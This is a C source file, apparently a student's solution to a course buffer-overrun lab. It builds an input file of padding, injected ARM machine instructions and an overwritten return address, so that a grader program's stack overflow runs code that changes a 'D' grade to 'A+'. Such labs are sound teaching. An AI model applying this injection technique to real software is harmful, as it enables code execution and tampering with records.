/*-------------------------------------------------------------------*/
/* createdataAplus.c                                                 */
/* Author: Emily Qian, Claire Shin                                   */
/*-------------------------------------------------------------------*/

/*
 * Produces a file called dataAplus with the student name, 
 * a null terminator, padding to overrun the stack, and 
 * injected instructions (via mini-assembler functions) 
 * that will modify the saved return address and grade variable
 * to cause the grader to assign an 'A+' grade. 
 */

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/*
 * This main function takes no command-line arguments and does not 
 * read from stdin. It writes a sequence of bytes (student name, 
 * null-padding, and a return address) to the "dataAplus" file. 
 * These bytes use buffer overrun in the grader program
 * to modify the saved return address and grade variable. 
 * On success, main writes nothing to stdout.
 * On failure, main prints an error message to stderr and returns 1.
 */
int main(void) {
    char* name = "Shin Qian";
    int i;
    unsigned long instructionAddress;
    unsigned int MOV, ADR, STRB, BL, B;

    /* open "dataAplus" file, 
    exit with error if file can't be opened */
    FILE *psFile = fopen("dataAplus", "wb");
    if (psFile == NULL) {
        perror("Error opening file");
        return 1; 
    }

    /* write name and null terminator
    name length = 9 excluding null terminator */
    fwrite(name, 1, 9, psFile); 
    fputc('\0', psFile);

    /* add padding to overflow buffer 
    10 = 48 - 10 (name and null) 
    - 4*6 (6 lines of instructions, each 4 bytes) 
    - 4 (A and null padding)*/
    for (i = 0; i < 10; i++) {
        fputc(0x00, psFile);
    }

    /* write 'A' and additional null bytes for 4-byte alignment */
    fputc('A', psFile);
    for (i = 0; i < 3; i++) {
        fputc(0x00, psFile);
    }

    /* place instructions via the MiniAssembler functions to be 
    executed by grader program after we overwrite return address.
    instructions to print 'A' and overwrite 'D' with '+' */

    /* Move address for 'A' 
    0x42006c corresponds to name[20]: target address 
    0x420070 corresponds to name[24] which is reference for MOV */
    MOV = MiniAssembler_adr(0, 0x42006c, 0x420070); 
    fwrite(&MOV, sizeof(unsigned int), 1, psFile);

    /* BL to printf */
    /* 0x400690 corresponds to address of next
    instruction we want processor to execute.
    0x420074 corresponds to name[28] which is reference for BL */
    BL = MiniAssembler_bl(0x400690, 0x420074); 
    fwrite(&BL, sizeof(unsigned int), 1, psFile);

    /* replace 'D' with '+' */
    /* move '+' into register */
    MOV = MiniAssembler_mov(0, '+'); 
    fwrite(&MOV, sizeof(unsigned int), 1, psFile);
    /* get address of 'D'. 0x420044 holds the grade variable.   
    0x42007c is name[36] corresponding to ADR */
    ADR = MiniAssembler_adr(1, 0x420044, 0x42007c); 
    fwrite(&ADR, sizeof(unsigned int), 1, psFile);
    /* store '+' at address */
    STRB = MiniAssembler_strb(0, 1); 
    fwrite(&STRB, sizeof(unsigned int), 1, psFile);

    /* Branch back */
    /* 0x40089c corresponds to next
    instruction we want processor to execute.
    0x420084 corresponds to name[44] which is reference to B */
    B = MiniAssembler_b(0x40089c, 0x420084); 
    fwrite(&B, sizeof(unsigned int), 1, psFile);

    /* write the address of instructions in memory */
    instructionAddress = 0x420070; /* starting address */
    fwrite(&instructionAddress, sizeof(unsigned long), 1, psFile);

    /* close file, return success */
    fclose(psFile);
    return 0;
}